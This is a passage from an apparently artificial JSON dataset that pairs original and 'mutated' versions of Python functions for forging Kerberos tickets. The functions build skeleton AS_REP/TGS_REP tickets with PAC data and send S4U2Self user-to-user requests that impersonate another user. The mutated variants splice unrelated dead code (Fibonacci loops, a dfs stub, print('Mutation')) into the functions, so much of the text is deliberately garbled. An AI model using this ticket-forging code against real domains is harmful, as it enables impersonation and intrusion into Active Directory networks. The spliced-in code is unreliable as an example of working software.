parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) < 64):\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. Can't continue\")\n            return (None, None)\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target\n    else:\n        logging.info('Creating basic skeleton ticket and PAC Infos')\n        if self.__domain == self.__server:\n            kdcRep = AS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value\n        else:\n            kdcRep = TGS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value\n        kdcRep['pvno'] = 5\n        if self.__options.nthash is None:\n            kdcRep['padata'] = noValue\n            kdcRep['padata'][0] = noValue\n            kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value\n            etype2 = ETYPE_INFO2()\n            etype2[0] = noValue\n            if len(self.__options.aesKey) == 64:\n                etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n            etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)\n            encodedEtype2 = encoder.encode(etype2)\n            kdcRep['padata'][0]['padata-value'] = encodedEtype2\n        kdcRep['crealm'] = self.__domain.upper()\n        kdcRep['cname'] = noValue\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__target\n        kdcRep['ticket'] = noValue\n        kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value\n        kdcRep['ticket']['realm'] = self.__domain.upper()\n        kdcRep['ticket']['sname'] = noValue\n        kdcRep['ticket']['sname']['name-string'] = noValue\n        kdcRep['ticket']['sname']['name-string'][0] = self.__service\n        if self.__domain == self.__server:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()\n        else:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__server\n        kdcRep['ticket']['enc-part'] = noValue\n        kdcRep['ticket']['enc-part']['kvno'] = 2\n        kdcRep['enc-part'] = noValue\n        if self.__options.nthash is None:\n            if len(self.__options.aesKey) == 64:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n        else:\n            kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n            kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n        kdcRep['enc-part']['kvno'] = 2\n        kdcRep['enc-part']['cipher'] = noValue\n    pacInfos = self.createBasicPac(kdcRep)\n    return (kdcRep, pacInfos)",
            "def createBasicTicket(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.__options.request is True:\n        if self.__domain == self.__server:\n            logging.info('Requesting TGT to target domain to use as basis')\n        else:\n            logging.info('Requesting TGT/TGS to target domain to use as basis')\n        if self.__options.hashes is not None:\n            (lmhash, nthash) = self.__options.hashes.split(':')\n        else:\n            lmhash = ''\n            nthash = ''\n        userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(lmhash), unhexlify(nthash), None, self.__options.dc_ip)\n        (self.__tgt, self.__tgt_cipher, self.__tgt_session_key) = (tgt, cipher, sessionKey)\n        if self.__domain == self.__server:\n            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        else:\n            serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)\n            (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, self.__domain, None, tgt, cipher, sessionKey)\n            kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])\n        encPartCipher = int(kdcRep['enc-part']['etype'])\n        if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and self.__options.nthash is None:\n            logging.critical(\"rc4_hmac is used in this ticket and you haven't specified the -nthash parameter. Can't continue ( or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) > 32):\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) < 64):\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. Can't continue\")\n            return (None, None)\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target\n    else:\n        logging.info('Creating basic skeleton ticket and PAC Infos')\n        if self.__domain == self.__server:\n            kdcRep = AS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value\n        else:\n            kdcRep = TGS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value\n        kdcRep['pvno'] = 5\n        if self.__options.nthash is None:\n            kdcRep['padata'] = noValue\n            kdcRep['padata'][0] = noValue\n            kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value\n            etype2 = ETYPE_INFO2()\n            etype2[0] = noValue\n            if len(self.__options.aesKey) == 64:\n                etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n            etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)\n            encodedEtype2 = encoder.encode(etype2)\n            kdcRep['padata'][0]['padata-value'] = encodedEtype2\n        kdcRep['crealm'] = self.__domain.upper()\n        kdcRep['cname'] = noValue\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__target\n        kdcRep['ticket'] = noValue\n        kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value\n        kdcRep['ticket']['realm'] = self.__domain.upper()\n        kdcRep['ticket']['sname'] = noValue\n        kdcRep['ticket']['sname']['name-string'] = noValue\n        kdcRep['ticket']['sname']['name-string'][0] = self.__service\n        if self.__domain == self.__server:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()\n        else:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__server\n        kdcRep['ticket']['enc-part'] = noValue\n        kdcRep['ticket']['enc-part']['kvno'] = 2\n        kdcRep['enc-part'] = noValue\n        if self.__options.nthash is None:\n            if len(self.__options.aesKey) == 64:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n        else:\n            kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n            kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n        kdcRep['enc-part']['kvno'] = 2\n        kdcRep['enc-part']['cipher'] = noValue\n    pacInfos = self.createBasicPac(kdcRep)\n    return (kdcRep, pacInfos)"
        ]
    },
    {
        "func_name": "getKerberosS4U2SelfU2U",
        "original": "def getKerberosS4U2SelfU2U(self):\n    tgt = self.__tgt\n    cipher = self.__tgt_cipher\n    sessionKey = self.__tgt_session_key\n    kdcHost = self.__options.dc_ip\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.renewable_ok.value)\n    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    return (r, None, sessionKey, None)",
        "mutated": [
            "def getKerberosS4U2SelfU2U(self):\n    if False:\n        i = 10\n    tgt = self.__tgt\n    cipher = self.__tgt_cipher\n    sessionKey = self.__tgt_session_key\n    kdcHost = self.__options.dc_ip\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.renewable_ok.value)\n    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    return (r, None, sessionKey, None)",
            "def getKerberosS4U2SelfU2U(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    tgt = self.__tgt\n    cipher = self.__tgt_cipher\n    sessionKey = self.__tgt_session_key\n    kdcHost = self.__options.dc_ip\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.renewable_ok.value)\n    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    return (r, None, sessionKey, None)",
            "def getKerberosS4U2SelfU2U(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    tgt = self.__tgt\n    cipher = self.__tgt_cipher\n    sessionKey = self.__tgt_session_key\n    kdcHost = self.__options.dc_ip\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.renewable_ok.value)\n    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    return (r, None, sessionKey, None)",
            "def getKerberosS4U2SelfU2U(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    tgt = self.__tgt\n    cipher = self.__tgt_cipher\n    sessionKey = self.__tgt_session_key\n    kdcHost = self.__options.dc_ip\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    